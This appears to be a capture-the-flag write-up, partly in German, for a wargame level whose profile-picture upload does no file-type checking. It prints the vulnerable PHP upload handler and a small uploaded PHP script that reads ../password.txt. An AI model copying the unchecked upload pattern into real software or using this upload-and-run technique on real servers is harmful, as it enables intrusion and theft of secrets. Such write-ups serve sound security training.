LEVEL 02
========

Simple file upload application. Filetypes were not checked, you can
upload anything... so let's upload a little PHP-Script to read
../password.txt.

---

In Level 2 könnt ihr in einem "sozialen Netzwerk" ein Profilbild hochladen. Das funktioniert super!

    <?php
      session_start();

      if ($_FILES["dispic"]["error"] > 0) {
        echo "<p>Error: " . $_FILES["dispic"]["error"] . "</p>";
      }
      else
      {
        $dest_dir = "uploads/";
        $dest = $dest_dir . basename($_FILES["dispic"]["name"]);
        $src = $_FILES["dispic"]["tmp_name"];
        if (move_uploaded_file($src, $dest)) {
          $_SESSION["dispic_url"] = $dest;
          chmod($dest, 0644);
          echo "<p>Successfully uploaded your display picture.</p>";
        }
      }

      $url = "https://upload.wikimedia.org/wikipedia/commons/f/f8/" .
             "Question_mark_alternate.svg";
      if (isset($_SESSION["dispic_url"])) {
        $url = $_SESSION["dispic_url"];
      }
    ?>

Die oben stehende Routine ist für den Upload eurer Bilddatei verantwortlich. Auffällig ist hier, dass es keinerlei Validierung der Datei gibt. Ihr könnt im Endeffekt jede beliebige Datei hochladen. Wir wollen dringend die Datei _./password.txt_ auslesen! Was tun? Ein winziges PHP-Script schreiben, dass die anvisierte Datei öffnet und uns im Browser ausgibt.

    <?php 
      echo trim(file_get_contents("../password.txt"));
    ?>

Danach einfach _uploads/eure_php.php_ ausführen, schon kennen wir das Passwort!